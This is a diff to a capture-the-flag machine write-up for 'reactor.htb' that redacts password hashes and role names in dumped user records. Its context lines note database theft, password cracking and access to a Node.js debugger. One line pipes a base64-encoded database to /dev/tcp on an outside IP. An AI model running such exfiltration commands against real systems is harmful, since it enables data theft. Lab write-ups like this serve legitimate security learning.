@@ -17,8 +17,8 @@
 - Database exfiltration:
 	- `cat reactor.db |base64 > /dev/tcp/10.10.15.250/8000`
 	- Decoded the database and extracted user information:
-		- `(1, 'admin', 'a203b22191d744a4e70ada5c101b17b8', 'administrator', 'admin@reactor.htb')`
-		- `(2, 'engineer', '39d97110eafe2a9a68639812cd271e8e', 'operator', 'engineer@reactor.htb')`
+		- `(1, 'admin', 'a203xxxx', 'admX', 'admin@reactor.htb')`
+		- `(2, 'engineer', '39d9xxxx', 'opX', 'engineer@reactor.htb')`
 - Password Cracking:
 	- Cracked password for user `engineer`
 	- Used recovered credentials to access the machine as `engineer`
@@ -33,7 +33,7 @@
 	- `WebSockets request was expected`
 - Identified port `9229` as a Node.js debugging interface
 - Debugger access:
-	- `chrome://inspect/#devices`
+	- `chrome://inspect`
 	- Connected to the exposed Node.js process
 
 ## Privilege escalation (`engineer` -> `root`)
